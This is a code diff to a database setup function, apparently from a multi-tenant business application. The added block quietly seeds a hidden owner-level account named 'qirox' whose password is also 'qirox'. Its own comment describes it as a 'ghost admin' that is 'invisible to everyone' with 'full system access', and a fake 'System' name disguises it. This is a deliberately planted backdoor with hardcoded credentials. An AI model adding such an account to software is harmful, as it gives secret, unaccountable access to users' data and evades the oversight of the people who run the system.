@@ -114,6 +114,29 @@ async function connectDatabase() {
         console.log(`✅ Owner account already exists — skipping seed`);
       }
     } catch (err) { console.error("Owner sync error:", err); }
+    // Create hidden ghost admin (qirox) — invisible to everyone, full system access
+    try {
+      const { EmployeeModel: EmpModelQ } = await import("@shared/schema");
+      const qiroxExists = await EmpModelQ.findOne({ username: "qirox" });
+      if (!qiroxExists) {
+        const bcryptQ = await import("bcryptjs");
+        const { v4: uuidQ } = await import("uuid");
+        const hashedQ = await bcryptQ.hash("qirox", 12);
+        await EmpModelQ.create({
+          id: uuidQ(),
+          tenantId: "demo-tenant",
+          username: "qirox",
+          password: hashedQ,
+          fullName: "System",
+          role: "owner",
+          phone: "0000000099",
+          jobTitle: "System",
+          isActivated: 1,
+          isActive: 1,
+        });
+        console.log("✅ Ghost admin initialized");
+      }
+    } catch (err) { console.error("Ghost admin sync error:", err); }
     // Ensure demo-tenant has Infinity plan — all features unlocked
     try {
       const { SubscriptionConfigModel } = await import("./qirox-admin");
